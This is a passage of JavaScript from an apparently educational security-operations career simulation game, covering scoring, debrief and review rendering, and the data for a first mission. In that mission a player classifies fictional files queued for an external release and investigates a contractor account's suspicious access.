  // missions (M1) use classification accuracy; command-model missions use the
  // single identification; a mission with neither falls back to evidence quality.
  // For M1 (files present) this is identical to the original classificationQuality().
  const accuracy = simFiles().length ? classificationQuality()
    : (SIM.def && SIM.def.identify) ? identificationQuality()
    : evidenceQuality();
  const timing = SIM.evidence.size > 0 ? 1 : 0;
  const sev = (SIM.def && SIM.def.severity) || 'MEDIUM';
  const sevBoost = sev === 'CRITICAL' ? 10 : sev === 'HIGH' ? 10 : sev === 'MEDIUM' ? 5 : 0;
  let score = 0;
  score += q * 30;                                   // evidence surfaced
  score += accuracy * 25;                            // correct answer (classify / identify)
  score += (CAREER.executiveTrust / 100) * 12;
  score += (CAREER.careerReputation / 100) * 8;
  score += timing ? 8 : 0;
  score += investigationComplete() ? 7 : 0;          // M1: allFilesRead(); M2+: coreCommandsRun()
  score += sevBoost;
  let verdict, multiplier;
  if (score >= 70)      { verdict = 'Approved';            multiplier = 1;   }
  else if (score >= 50) { verdict = 'Partially Approved';  multiplier = 0.6; }
  else if (score >= 30) { verdict = 'Deferred';            multiplier = 0.3; }
  else                  { verdict = 'Denied';              multiplier = 0;   }
  return { verdict, multiplier, score: Math.round(score), evidenceQuality: q, classificationQuality: accuracy };
}

function scaleDeltas(deltas, m) {
  const out = {};
  Object.keys(deltas).forEach(k => { out[k] = Math.round(deltas[k] * m); });
  return out;
}

function recommendationReason(o) {
  const ev = Math.round(o.evidenceQuality * 100);
  const cl = Math.round((o.classificationQuality || 0) * 100);
  if (simFiles().length) {
    // FILE-MODEL (Mission 1) — wording unchanged.
    if (o.verdict === 'Approved')           return `Strong, well-evidenced case — ${ev}% of evidence gathered, ${cl}% of files classified correctly. Leadership approved it in full.`;
    if (o.verdict === 'Partially Approved') return `Reasonable case — ${ev}% evidence, ${cl}% classified correctly. Leadership approved part of it, pending tighter work.`;
    if (o.verdict === 'Deferred')           return `Thin work — ${ev}% evidence, ${cl}% classified correctly. Leadership deferred the decision for now.`;
    return `Insufficient case — ${ev}% evidence, ${cl}% classified correctly. Leadership declined — investigate and classify before recommending.`;
  }
  // COMMAND-MODEL (Mission 2+) — accuracy is the identification, not classification.
  const idOk = (SIM.def && SIM.def.identify) ? identificationQuality() === 1 : null;
  const accLabel = idOk === null ? `${cl}% accuracy`
    : idOk ? 'the right target identified' : 'the wrong target identified';
  if (o.verdict === 'Approved')           return `Strong, well-evidenced case — ${ev}% of evidence gathered, ${accLabel}. Leadership approved it in full.`;
  if (o.verdict === 'Partially Approved') return `Reasonable case — ${ev}% evidence, ${accLabel}. Leadership approved part of it, pending tighter work.`;
  if (o.verdict === 'Deferred')           return `Thin work — ${ev}% evidence, ${accLabel}. Leadership deferred the decision for now.`;
  return `Insufficient case — ${ev}% evidence, ${accLabel}. Leadership declined — gather evidence and confirm the target before recommending.`;
}

/* CONSEQUENCE + REPORT — Immediate / Business / Resource / Future, plus the
 * mission debrief (verdict, carry-forward flags, classification review). */
function conseqBlock(kind, label, lines) {
  const body = (Array.isArray(lines) ? lines : [lines])
    .map(l => `<div class="sim-conseq-text">${l}</div>`).join('');
  return `<div class="sim-conseq-block"><div class="sim-conseq-label sim-conseq-label--${kind}">${label}</div>${body}</div>`;
}

/* CAMPAIGN RECONSTRUCTION (Mission 4 capstone) — render the kill chain
 * Recon → Foothold → Credential Access → Exfiltration as one adversary campaign.
 * Data-gated on def.campaignReveal; presentation-only (reads nothing mutable). */
function campaignRevealHtml(r) {
  const chain = (Array.isArray(r.chain) ? r.chain : []).map((s, i) => `
    <li class="sim-campaign-stage">
      <span class="sim-campaign-step">${i + 1}</span>
      <div class="sim-campaign-stage-body">
        <div class="sim-campaign-stage-head"><span class="sim-campaign-op">${s.op || ''}</span><span class="sim-campaign-tag">${s.stage || ''}</span></div>
        <div class="sim-campaign-line">${s.line || ''}</div>
      </div>
    </li>`).join('');
  return `
    <div class="sim-campaign">
      <div class="sim-campaign-head">${r.title || 'CAMPAIGN RECONSTRUCTION'}</div>
      ${r.intro ? `<p class="sim-campaign-intro">${r.intro}</p>` : ''}
      <ol class="sim-campaign-chain">${chain}</ol>
      ${r.closer ? `<p class="sim-campaign-closer">${r.closer}</p>` : ''}
    </div>`;
}

/* Tone for a resource value in the performance review: green/amber/red bands.
 * Money + higher-better metrics share a "more is better" rule; complianceExposure
 * (lower is better) is inverted. */
function reviewResourceTone(d, v) {
  if (d.kind === 'money') return v >= 40000 ? 'good' : v >= 20000 ? 'warn' : 'low';
  if (d.higherBetter) return v >= 70 ? 'good' : v >= 40 ? 'warn' : 'low';
  return v <= 15 ? 'good' : v <= 40 ? 'warn' : 'low';
}

/* QUARTERLY PERFORMANCE REVIEW (Mission 4 capstone) — PREVIEW-ONLY. Reports the
 * organization's health + this analyst's investigation quality, and PREVIEWS the
 * next role from the ladder WITHOUT unlocking it (promotion stays deferred; role
 * is unchanged). Reads state; mutates nothing. */
function performanceReviewHtml() {
  const cur = activeRole();
  const next = CAREER_ROLES.find(r => r.authorityLevel === cur.authorityLevel + 1);
  const resLines = RESOURCE_DEFS.map(d => {
    const v = CAREER[d.key];
    const tone = reviewResourceTone(d, v);
    const disp = d.kind === 'money' ? '$' + Number(v).toLocaleString('en-US') : v + '%';
    return `<li class="sim-review-metric sim-review-metric--${tone}"><span class="sim-review-metric-name">${d.label}</span><span class="sim-review-metric-val">${disp}</span></li>`;
  }).join('');
  const qLines = `
    <li class="sim-review-metric"><span class="sim-review-metric-name">Investigation Confidence</span><span class="sim-review-metric-val">${investigationConfidence()}%</span></li>
    <li class="sim-review-metric"><span class="sim-review-metric-name">Evidence Gathered</span><span class="sim-review-metric-val">${SIM.evidence.size} items</span></li>`;
  const completed = Array.isArray(CAREER.completedMissions) ? CAREER.completedMissions.length : 0;
  const preview = next
    ? `<div class="sim-review-next">
        <div class="sim-review-next-label">NEXT ON THE LADDER</div>
        <div class="sim-review-next-role">${next.title}</div>
        <div class="sim-review-next-dept">${next.department || ''}</div>
        <div class="sim-review-next-note">Previewed only — promotion is reviewed after sustained performance. Your current role stands.</div>
      </div>`
    : `<div class="sim-review-next"><div class="sim-review-next-note">You are at the top of the current ladder.</div></div>`;
  return `
    <div class="sim-review">
      <div class="sim-review-head">QUARTERLY PERFORMANCE REVIEW</div>
      <div class="sim-review-role">Current role: <strong>${cur.title}</strong> · Cases closed: ${completed}</div>
      <div class="sim-review-section-label">ORGANIZATIONAL HEALTH</div>
      <ul class="sim-review-metrics">${resLines}</ul>
      <div class="sim-review-section-label">ANALYST PERFORMANCE</div>
      <ul class="sim-review-metrics">${qLines}</ul>
      ${preview}
    </div>`;
}

function renderDebrief(action, outcome, changes) {
  const host = document.getElementById('simFeedback');
  if (!host) return;
  const c = action.consequence || {};
  const denied = outcome && outcome.verdict === 'Denied';

  let html = `<div class="sim-panel-head">MISSION DEBRIEF</div><div class="sim-feedback-body">`;
  html += `<div class="sim-conseq">`;
  html += `<div class="sim-conseq-title">${action.label}</div>`;
  html += `<div class="sim-conseq-sub">${action.outcomeSub || 'Decision recorded.'}</div>`;

  if (outcome) {
    const cls = outcome.verdict === 'Approved' ? 'approved'
      : outcome.verdict === 'Partially Approved' ? 'partial'
      : outcome.verdict === 'Deferred' ? 'deferred' : 'denied';
    html += `<div class="sim-rec-outcome sim-rec-outcome--${cls}">
      <div class="sim-rec-verdict">LEADERSHIP VERDICT: ${outcome.verdict.toUpperCase()}</div>
      <div class="sim-rec-reason">${recommendationReason(outcome)}</div></div>`;
  }

  if (!denied) {
    if (c.immediate) html += conseqBlock('immediate', 'Immediate Impact', c.immediate);
    if (c.business)  html += conseqBlock('business', 'Business Impact', c.business);
  } else if (action.deniedNote) {
    html += conseqBlock('immediate', 'Immediate Impact', action.deniedNote);
  }

  // Resource changes
  html += `<div class="sim-conseq-block"><div class="sim-conseq-label sim-conseq-label--resource">Resource Changes</div><ul class="sim-conseq-changes">`;
  const moved = changes.filter(ch => ch.after !== ch.before);
  if (moved.length) {
    moved.forEach(ch => {
      const def = RESOURCE_DEFS.find(d => d.key === ch.key);
      const diff = ch.after - ch.before;
      const dir = diff > 0 ? 'up' : diff < 0 ? 'down' : 'flat';
      const disp = def.kind === 'money'
        ? (diff >= 0 ? '+' : '−') + '$' + Math.abs(diff).toLocaleString('en-US')
        : (diff > 0 ? '+' : '') + diff;
      html += `<li class="sim-conseq-change"><span class="sim-conseq-change-name">${def.label}</span><span class="sim-conseq-change-delta--${dir}">${disp}</span></li>`;
    });
  } else {
    html += `<li class="sim-conseq-change"><span class="sim-conseq-change-name">No net resource change</span><span class="sim-conseq-change-delta--flat">—</span></li>`;
  }
  html += `</ul></div>`;

  if (!denied && c.future) html += conseqBlock('future', 'Future Impact', c.future);
  html += `</div>`; // .sim-conseq

  // CASE CONTINUITY — CARRIED FORWARD: plain-language note of how each active
  // dynamic condition (a prior-mission decision) changed THIS outcome. Present
  // only when carry-flags activated a condition; the resource deltas they cause
  // already show in Resource Changes above.
  const notes = outcomeNotes(SIM.dynamic);
  if (notes.length) {
    html += `<div class="sim-cont-impact">
      <div class="sim-conseq-label sim-conseq-label--future">CASE CONTINUITY — CARRIED FORWARD</div>
      <ul class="sim-cont-impact-list">
        ${notes.map(n => `<li class="sim-cont-impact-item sim-cont-impact-item--${n.tone}">${n.text}</li>`).join('')}
      </ul></div>`;
  }

  // CAMPAIGN REVEAL + PERFORMANCE REVIEW — Mission 4 capstone beats. Both are
  // presentation-only: they read state but never touch scoring/resources/role/
  // completedMissions. Data-gated, so earlier missions are unaffected.
  const reveal = SIM.def && SIM.def.campaignReveal;
  if (reveal) html += campaignRevealHtml(reveal);
  if (SIM.def && SIM.def.performanceReview) html += performanceReviewHtml();

  html += reportSectionHtml();
  html += `</div>`; // .sim-feedback-body
  host.innerHTML = html;
}

/* Carry-forward flags for the active mission. Each mission may define its own
 * `carryFlags:[{key,label}]`; the legacy CANON_FLAGS/FLAG_LABELS are the fallback
 * so Mission 1 (and any un-migrated mission) still reports correctly. */
function missionCarryFlags() {
  const def = SIM.def;
  if (def && Array.isArray(def.carryFlags) && def.carryFlags.length) return def.carryFlags;
  return CANON_FLAGS.map(k => ({ key: k, label: FLAG_LABELS[k] || k }));
}

function reportSectionHtml() {
  const setFlags = missionCarryFlags().filter(f => CAREER.missionFlags[f.key]);
  const flagItems = setFlags.length
    ? setFlags.map(f => `<li class="sim-report-flag"><span class="sim-report-flag-icon">▸</span><span>${f.label}</span></li>`).join('')
    : `<li class="sim-report-flag"><span class="sim-report-flag-icon">▸</span><span>No carry-forward flags raised.</span></li>`;

  // Accuracy review — GRADED: this feeds the recommendation outcome. File-model
  // missions (M1) review classification; command-model missions review the single
  // identification (which device / which account). Missions with neither skip it.
  let reviewHtml = '';
  const files = simFiles();
  if (files.length) {
    const correct = files.filter(f => SIM.classified[f.name] === f.trueClassification).length;
    const accPct = Math.round((correct / files.length) * 100);
    const rows = files.map(f => {
      const chosen = SIM.classified[f.name];
      const mark = !chosen ? '—' : (chosen === f.trueClassification ? '✓' : '✗');
      return `<li class="sim-report-flag"><span class="sim-report-flag-icon">${mark}</span><span>${f.name} — should be <strong>${classLabel(f.trueClassification)}</strong>${chosen ? ` · you marked ${classLabel(chosen)}` : ' · unclassified'}</span></li>`;
    }).join('');
    reviewHtml = `
      <div class="sim-report-section">
        <div class="sim-conseq-label sim-conseq-label--business">CLASSIFICATION REVIEW — ${correct}/${files.length} correct (${accPct}%)</div>
        <ul class="sim-report-flags">${rows}</ul>
      </div>`;
  } else if (SIM.def && SIM.def.identify) {
    const idf = SIM.def.identify;
    const opts = idf.options || [];
    const chosenOpt = opts.find(o => o.id === SIM.identified);
    const correctOpt = opts.find(o => o.id === idf.correctId);
    const ok = SIM.identified === idf.correctId;
    const mark = !SIM.identified ? '—' : (ok ? '✓' : '✗');
    reviewHtml = `
      <div class="sim-report-section">
        <div class="sim-conseq-label sim-conseq-label--business">IDENTIFICATION REVIEW</div>
        <ul class="sim-report-flags">
          <li class="sim-report-flag"><span class="sim-report-flag-icon">${mark}</span><span>${idf.reviewLabel || 'Answer'}: <strong>${correctOpt ? correctOpt.label : ''}</strong>${SIM.identified ? ` · you chose ${chosenOpt ? chosenOpt.label : SIM.identified}` : ' · not identified'}</span></li>
        </ul>
      </div>`;
  }

  return `
    <div class="sim-report">
      <div class="sim-report-section">
        <div class="sim-conseq-label sim-conseq-label--future">CARRY-FORWARD FLAGS</div>
        <ul class="sim-report-flags">${flagItems}</ul>
      </div>
      ${reviewHtml}
      <button type="button" class="sim-report-done" data-done="1">RETURN TO OPERATIONS CENTER</button>
    </div>`;
}

/* Build + upsert this mission's company-timeline record from the decision
 * context the caller already holds (decision label/kind, leadership verdict,
 * the applied resource changes). Pure-ish: only mutates CAREER.companyHistory
 * via the idempotent upsert. Confidence + raised flags are read from live SIM
 * state at finalize time (evidence is fully surfaced by then). */
function recordCompanyHistory(ctx) {
  if (!SIM.missionId) return;
  const def = SIM.def || {};
  const c = ctx || {};
  const moved = (Array.isArray(c.changes) ? c.changes : [])
    .filter(ch => ch.after !== ch.before)
    .map(ch => ({ key: ch.key, before: ch.before, after: ch.after, delta: ch.after - ch.before }));
  const raised = missionCarryFlags().filter(f => CAREER.missionFlags[f.key]).map(f => f.key);
  const entry = {
    missionId: SIM.missionId,
    title: def.title || SIM.missionId,
    opId: def.opId || '',
    completedAt: Date.now(),
    decisionLabel: c.decisionLabel || '',
    decisionKind: c.decisionKind || '',
    verdict: c.verdict || null,
    confidencePct: investigationConfidence(),
    resourceChanges: moved,
    raisedFlags: raised,
  };
  CAREER.companyHistory = upsertCompanyHistory(CAREER.companyHistory, entry);
}

/* ================================================================== *
 * CAREER ENGINE (P4) — record completion + persist. Rank is DERIVED
 * from the active role; promotion is deferred (out of slice scope).
 * ================================================================== */
function finalizeMission(ctx) {
  if (!SIM.missionId) return;
  if (!Array.isArray(CAREER.completedMissions)) CAREER.completedMissions = [];
  if (!CAREER.completedMissions.includes(SIM.missionId)) CAREER.completedMissions.push(SIM.missionId);
  // COMPANY TIMELINE — record this mission's outcome so later briefs can show
  // "the company remembers". Built from the decision context the caller already
  // has (never reconstructed from the DOM) and upserted idempotently by mission
  // id, so a replay REPLACES rather than duplicates the entry.
  recordCompanyHistory(ctx);
  CAREER.currentRank = roleById(CAREER.currentRole).title; // promotion deferred — stays Intern
  saveCareerState();
  renderResourceBar();
  // Shipping integration: record REAL host completion through the canonical
  // chokepoint (sets the mission flag, awards XP, persists via saveProgress,
  // unlocks the next assignment on the Ops Center map, closes the cloud attempt).
  // Host-side idempotent (already-complete -> no-op) and never throws, so a replay
  // or a missing bridge (standalone) leaves the sim unaffected.
  try {
    if (typeof window !== 'undefined' && typeof window.echCareerComplete === 'function') {
      window.echCareerComplete(SIM.missionId);
    }
  } catch (_) { /* host completion is best-effort; never break the sim */ }
}

/* ================================================================== *
 * MISSION DATASETS — generic; engines never name a mission directly.
 * P1 supplies Mission 1's brief; P2–P4 add files/evidence/actions/etc.
 * ================================================================== */
const CAREER_MISSIONS = {
  'mission-001': {
    id: 'mission-001',
    opId: 'OPS-2026-001',
    severity: 'HIGH',
    region: 'EMEA REGION',
    title: 'Protect Sensitive Information',
    threatClass: 'Data Classification & Information Handling',
    priority: 'P2 — HIGH',
    promptLabel: 'intern@cybercorp:~/release$',
    carryFlags: [
      { key: 'contractorAccessDiscovered', label: 'Contractor access flagged for follow-up' },
      { key: 'sensitiveDataExposed',       label: 'Sensitive-data exposure on record' },
      { key: 'legalReviewTriggered',       label: 'Legal review opened' },
      { key: 'contractorAccessIgnored',    label: 'Contractor access left unreviewed' },
    ],
    evidenceEmpty: 'No evidence yet. Use the terminal to review the files, then classify what you find.',
    risks: [
      { id: 'risk_pii',        label: 'Employee personal data (PII) is in the outbound release', triggeredBy: ['ev_pii_salary'] },
      { id: 'risk_pci',        label: 'Regulated customer payment records (PCI) are in the release', triggeredBy: ['ev_customer_pii'] },
      { id: 'risk_confidential',label: 'Confidential business information is bundled in', triggeredBy: ['ev_confidential_pricing', 'ev_confidential_roadmap'] },
      { id: 'risk_contractor', label: 'A contractor account accessed files outside its remit', triggeredBy: ['ev_contractor_access'] },
      { id: 'risk_noreview',   label: 'The release was assembled with no internal reviewer', triggeredBy: ['ev_release_context'] },
    ],

    // Reactive data-access map (Task #97) — review-only, same engine as
    // mission-002. Mission 1 has no real network, so the graph is a data-access
    // diagram: contractor account -> release package -> files. Only the two
    // genuinely pre-known anchors from the brief (the contractor who requested
    // the release and the release package itself) are seeded; each file appears
    // and flags ONLY once the player has read it, and the out-of-remit access
    // links appear ONLY once the access log is read. Nothing is persisted/scored.
    map: {
      cap: 'RELEASE REVIEW · OUTBOUND DATA FLOW — EMEA REGION',
      hint: 'Red marks sensitive files that should not leave and the contractor\u2019s out-of-remit access. Select any node or connection for analyst intel.',
      nodes: {
        contractor: {
          x: 13, y: 56, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir · vendor', seed: true,
          statusBy: { ev_contractor_access: 'suspicious' },
          intel: {
            what: 'The external vendor account that requested this outbound release.',
            technique: 'Its role is stated in the assignment brief and the release cover note (cat release_notes.txt).',
            why: 'An outside vendor account assembling a release of company files is the kind of access worth reviewing.' },
        },
        release: {
          x: 50, y: 33, glyph: '📦', label: 'release pkg', sub: 'queued external', seed: true,
          intel: {
            what: 'The shared folder queued to leave the company for an external partner.',
            technique: 'List and read the queued files (ls, then cat <file>) to see what is bundled inside.',
            why: 'Everything in this package is about to leave the building, so each file must be classified first.' },
        },
        partner: {
          x: 50, y: 10, glyph: '🌐', label: 'Meridian Logistics', sub: 'external partner',
          revealBy: 'ev_release_context',
          intel: {
            what: 'The external logistics partner the release is addressed to.',
            technique: 'Named in the release cover note (cat release_notes.txt).',
            why: 'It is outside the company, so anything bundled into the package would land in third-party hands.' },
        },
        f_datasheet: {
          x: 24, y: 88, glyph: '📄', label: 'product_datasheet', sub: 'public · safe',
          revealBy: 'ev_public_safe', statusBy: { ev_public_safe: 'identified' },
          intel: {
            what: 'A marketing datasheet already cleared for public distribution.',
            technique: 'cat product_datasheet.txt — marked cleared for public distribution by Marketing.',
            why: 'Already-public material is safe to share — the baseline of what a clean release looks like.' },
        },
        f_pricing: {
          x: 41, y: 91, glyph: '📄', label: 'partner_pricing', sub: 'confidential',
          revealBy: 'ev_confidential_pricing', statusBy: { ev_confidential_pricing: 'suspicious' },
          intel: {
            what: 'Negotiated per-partner pricing and renewal dates — internal commercial terms.',
            technique: 'cat partner_pricing_2026.csv — rates marked not for external eyes.',
            why: 'One partner seeing another\u2019s private rates is a confidentiality breach; it must not ship.' },
        },
        f_roadmap: {
          x: 58, y: 92, glyph: '📄', label: 'acquisition_roadmap', sub: 'confidential',
          revealBy: 'ev_confidential_roadmap', statusBy: { ev_confidential_roadmap: 'suspicious' },
          intel: {
            what: 'A draft, unannounced acquisition roadmap — material non-public information.',
            technique: 'cat acquisition_roadmap.txt — marked material non-public information, confidential.',
            why: 'Unannounced deal plans are market-sensitive; releasing them early is a leak and a legal risk.' },
        },
        f_salary: {
          x: 75, y: 90, glyph: '📄', label: 'employee_salaries', sub: 'restricted · PII',
          revealBy: 'ev_pii_salary', statusBy: { ev_pii_salary: 'suspicious' },
          intel: {
            what: 'Employee names, titles and salaries — HR-restricted personal data (PII).',
            technique: 'cat employee_salaries.csv — marked HR-Restricted, PII and compensation.',
            why: 'Personal pay data must never leave the company; in an external release it is a serious exposure.' },
        },
        f_payments: {
          x: 90, y: 82, glyph: '📄', label: 'customer_payments', sub: 'restricted · PCI',
          revealBy: 'ev_customer_pii', statusBy: { ev_customer_pii: 'suspicious' },
          intel: {
            what: 'Customer card last-4, amounts and processor references — regulated payment data (PCI).',
            technique: 'cat customer_payment_records.csv — marked regulated cardholder data (PCI scope).',
            why: 'Cardholder data is legally protected; sending it to a partner would be a regulated-data breach.' },
        },
      },
      links: [
        { a: 'contractor', b: 'release', revealBy: 'ev_release_context',
          intel: {
            what: 'The release package was assembled by the contractor account itself, with no internal reviewer.',
            technique: 'The cover note (cat release_notes.txt) shows it was prepared by the vendor account.',
            why: 'Normally an internal data owner signs off on what leaves; an outsider self-approving it is a gap.' } },
        { a: 'release', b: 'partner', revealBy: 'ev_release_context',
          intel: {
            what: 'The whole package is queued to be sent to the external partner.',
            technique: 'cat release_notes.txt — addressed to Meridian Logistics.',
            why: 'This is the door out of the company; whatever is in the package goes through it.' } },
        { a: 'release', b: 'f_datasheet', revealBy: 'ev_public_safe',
          intel: {
            what: 'The public datasheet is part of the outbound package.',
            technique: 'Listed by ls and read with cat product_datasheet.txt.',
            why: 'Public collateral is exactly what should be in a partner release — no concern.' } },
        { a: 'release', b: 'f_pricing', revealBy: 'ev_confidential_pricing', danger: true,
          intel: {
            what: 'Confidential partner pricing is bundled into the outbound package.',
            technique: 'cat partner_pricing_2026.csv reveals it sitting in the release.',
            why: 'Internal commercial terms heading to an external partner is a confidentiality breach.' } },
        { a: 'release', b: 'f_roadmap', revealBy: 'ev_confidential_roadmap', danger: true,
          intel: {
            what: 'The unannounced acquisition roadmap is bundled into the outbound package.',
            technique: 'cat acquisition_roadmap.txt reveals it sitting in the release.',
            why: 'Material non-public information leaving early is a leak with legal consequences.' } },
        { a: 'release', b: 'f_salary', revealBy: 'ev_pii_salary', danger: true,
          intel: {
            what: 'Restricted employee PII is bundled into the outbound package.',
            technique: 'cat employee_salaries.csv reveals it sitting in the release.',
            why: 'Personal salary data must never leave the company, least of all to a third party.' } },
        { a: 'release', b: 'f_payments', revealBy: 'ev_customer_pii', danger: true,
          intel: {
            what: 'Regulated customer payment data is bundled into the outbound package.',
            technique: 'cat customer_payment_records.csv reveals it sitting in the release.',
            why: 'Sending PCI cardholder data to a partner would be a regulated-data breach.' } },
        { a: 'contractor', b: 'f_salary', revealBy: 'ev_contractor_access', danger: true,
          intel: {
            what: 'The contractor account opened employee salary data at 02:00 — outside its remit.',
            technique: 'cat access_log.txt shows ext-contractor-07 reading employee_salaries.csv.',
            why: 'A vendor account reading HR files it has no role in is exactly the access that should be flagged.' } },
        { a: 'contractor', b: 'f_payments', revealBy: 'ev_contractor_access', danger: true,
          intel: {
            what: 'The contractor account opened customer payment records at 02:00 — outside its remit.',
            technique: 'cat access_log.txt shows ext-contractor-07 reading customer_payment_records.csv.',
            why: 'Regulated payment data accessed by an out-of-scope vendor account is a serious red flag.' } },
        { a: 'contractor', b: 'f_roadmap', revealBy: 'ev_contractor_access', danger: true,
          intel: {
            what: 'The contractor account opened the acquisition roadmap at 02:00 — outside its remit.',
            technique: 'cat access_log.txt shows ext-contractor-07 reading acquisition_roadmap.txt.',
            why: 'Material non-public deal information read by a vendor account is well beyond any legitimate need.' } },
      ],
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Data Handling Review', c: 'head' },
      { t: 'A shared folder is queued for an external release. Before it goes out, classify', c: 'dim' },
      { t: 'every file and decide how each should be handled. Review the files first.', c: 'dim' },
      { t: 'Type  ls  to list the folder, then  cat <file>  to read one. Type  help  anytime.', c: 'dim' },
    ],
    brief: {
      situation:
        'A contractor has requested an external release of a Finance shared folder. ' +
        'Routine, until access logs flagged the same contractor account reading files ' +
        'well outside its remit. Before anything leaves the building, review and classify ' +
        'the folder, judge the handling for each file, and decide what to do about the ' +
        'contractor activity.',
      objectives: [
        'Review every file in the release folder',
        'Classify each file (Public / Internal / Confidential / Restricted)',
        'Investigate the suspicious contractor access',
        'Decide how to handle the release — and justify it',
      ],
      managerNote:
        '"You are the intern on this one, so you do not get to approve a release yourself — ' +
        'and you should not. Classify carefully, and if something feels off, recommend or ' +
        'escalate. Document everything. — Sarah Reyes, SOC Lead"',
    },

    /* ---- INVESTIGATION: files queued for release (ground-truth handling) ---- */
    files: [
      {
        name: 'release_notes.txt',
        trueClassification: 'public',
        content: [
          'EXTERNAL RELEASE PACKAGE — Partner: Meridian Logistics',
          'Prepared by:  ext-contractor-07  (J. Demir, vendor account)',
          'Purpose:      share Q3 logistics collateral with the partner.',
          'Note:         "Bundled a few extra finance files to save a round trip." ',
        ],
        beginnerNote: 'A cover note for the release. It admits extra finance files were added in.',
        evidenceIds: ['ev_release_context'],
      },
      {
        name: 'product_datasheet.txt',
        trueClassification: 'public',
        content: [
          'CyberCorp LogiSuite — Product Datasheet (Marketing)',
          'Throughput, supported regions, published list pricing.',
          'Cleared for public distribution by Marketing.',
        ],
        beginnerNote: 'A marketing sheet that is already published — meant for the public.',
        evidenceIds: ['ev_public_safe'],
      },
      {
        name: 'partner_pricing_2026.csv',
        trueClassification: 'confidential',
        content: [
          'partner,tier,negotiated_rate,renewal_date',
          'Meridian Logistics,Gold,0.42/unit,2026-09-01',
          'Halden Freight,Silver,0.51/unit,2026-04-15',
          '# Internal negotiated rates — not for external eyes.',
        ],
        beginnerNote: 'The special prices the company privately agreed with each partner.',
        evidenceIds: ['ev_confidential_pricing'],
      },
      {
        name: 'employee_salaries.csv',
        trueClassification: 'restricted',
        content: [
          'name,department,title,annual_salary',
          'A. Okafor,Finance,Controller,128000',
          'L. Brandt,Engineering,Staff Engineer,176000',
          '# HR-Restricted. PII + compensation.',
        ],
        beginnerNote: 'Employees'+"'"+' names and how much each person is paid.',
        evidenceIds: ['ev_pii_salary'],
      },
      {
        name: 'customer_payment_records.csv',
        trueClassification: 'restricted',
        content: [
          'customer,card_last4,amount,processor_ref',
          'Northwind Co,4417,12450.00,TX-99312',
          'Bryce & Hall,8820,3275.50,TX-99318',
          '# Regulated cardholder data (PCI scope).',
        ],
        beginnerNote: 'Customers'+"'"+' card and payment details — protected by law.',
        evidenceIds: ['ev_customer_pii'],
      },
      {
        name: 'acquisition_roadmap.txt',
        trueClassification: 'confidential',
        content: [
          'PROJECT NORTHSTAR — Acquisition Roadmap (DRAFT, UNANNOUNCED)',
          'Target shortlist, valuation ranges, timeline through 2027.',
          '# Material non-public information. Confidential.',
        ],
        beginnerNote: 'A secret, unannounced plan about companies CyberCorp may buy.',
        evidenceIds: ['ev_confidential_roadmap'],
      },
      {
        name: 'access_log.txt',
        trueClassification: 'internal',
        content: [
          'ts                  account            file',
          '2026-06-11 02:14    ext-contractor-07  employee_salaries.csv',
          '2026-06-11 02:16    ext-contractor-07  customer_payment_records.csv',
          '2026-06-11 02:21    ext-contractor-07  acquisition_roadmap.txt',
          '# Vendor account reading HR/Finance files at 02:00, outside its remit.',
        ],
        beginnerNote: 'A record of who opened which files, and at what time.',
        evidenceIds: ['ev_contractor_access'],
      },
    ],

    /* ---- Ground-truth evidence (weighted; quality drives recommendations) ----
     * `label` is the legacy one-liner (still used in the terminal log + fallback).
     * `layers` adds beginner-first presentation; the engine never reads them.   */
    evidence: [
      {
        id: 'ev_release_context', label: 'Release was prepared by the contractor account itself.',
        qualityWeight: 1, source: 'release_notes.txt',
        layers: {
          beginner: {
            summary: 'The outside contractor put this release package together on their own.',
            why: 'Normally someone inside the company checks what an outsider is about to send out.',
            prompt: 'Should an outside contractor decide by themselves what leaves the company?',
          },
          analyst: 'The release set was assembled by the external contractor account, with no internal reviewer in the chain.',
          technical: 'Prepared by: ext-contractor-07 (vendor account). No internal data-owner sign-off recorded on the release manifest.',
          terms: [],
        },
      },
      {
        id: 'ev_public_safe', label: 'Public marketing collateral — safe to release externally.',
        qualityWeight: 1, source: 'product_datasheet.txt',
        layers: {
          beginner: {
            summary: 'This is a marketing sheet that has already been published.',
            why: 'Information that is already public is fine to share with a partner.',
            prompt: 'Is there any real risk in sharing something that is already public?',
          },
          analyst: 'Product datasheet — marketing-cleared collateral approved for public distribution.',
          technical: 'product_datasheet.txt — Classification: Public. Cleared for public distribution by Marketing.',
          terms: ['public'],
        },
      },
      {
        id: 'ev_confidential_pricing', label: 'Confidential partner pricing bundled into the release set.',
        qualityWeight: 2, source: 'partner_pricing_2026.csv',
        layers: {
          beginner: {
            summary: 'This file lists the special prices the company privately gives each partner.',
            why: 'Those negotiated prices are private — a competitor, or another partner, should not see them.',
            prompt: 'Should one partner be able to see the deal another partner was given?',
          },
          analyst: 'Negotiated partner pricing (per-unit rates and renewal dates) bundled into an outbound release — internal commercial data.',
          technical: 'partner_pricing_2026.csv — negotiated_rate + renewal_date per partner. Internal-only commercial terms; Confidential.',
          terms: ['confidential'],
        },
      },
      {
        id: 'ev_pii_salary', label: 'Employee names and salaries (PII) present in the release set.',
        qualityWeight: 3, source: 'employee_salaries.csv',
        layers: {
          beginner: {
            summary: 'This file has employees'+"'"+' names and how much each person is paid.',
            why: 'Pay and personal details are private — they should never leave the company.',
            prompt: 'Should employee salary information ever be sent to an outside partner?',
          },
          analyst: 'Employee personal data and compensation (PII) found in the outbound release set.',
          technical: 'employee_salaries.csv — name, department, title, annual_salary. HR-Restricted PII + compensation. Classification: Restricted.',
          terms: ['pii'],
        },
      },
      {
        id: 'ev_customer_pii', label: 'Regulated customer payment records present (PCI scope).',
        qualityWeight: 3, source: 'customer_payment_records.csv',
        layers: {
          beginner: {
            summary: 'This file holds customers'+"'"+' card and payment details.',
            why: 'Card and payment data is strictly protected by law — leaking it can mean fines and real harm to customers.',
            prompt: 'What could go wrong if customer payment details were sent outside the company?',
          },
          analyst: 'Customer cardholder data (card last-4, amounts, processor references) — regulated payment records in the release set.',
          technical: 'customer_payment_records.csv — card_last4, amount, processor_ref. Regulated cardholder data (PCI scope). Classification: Restricted.',
          terms: ['pci', 'pii'],
        },
      },
      {
        id: 'ev_confidential_roadmap', label: 'Unannounced acquisition roadmap (material non-public info).',
        qualityWeight: 2, source: 'acquisition_roadmap.txt',
        layers: {
          beginner: {
            summary: 'This is a secret plan about companies CyberCorp might buy.',
            why: 'Unannounced business plans are highly sensitive — sharing them early can break the law and tip off competitors.',
            prompt: 'Should an unannounced business plan be included in a partner release?',
          },
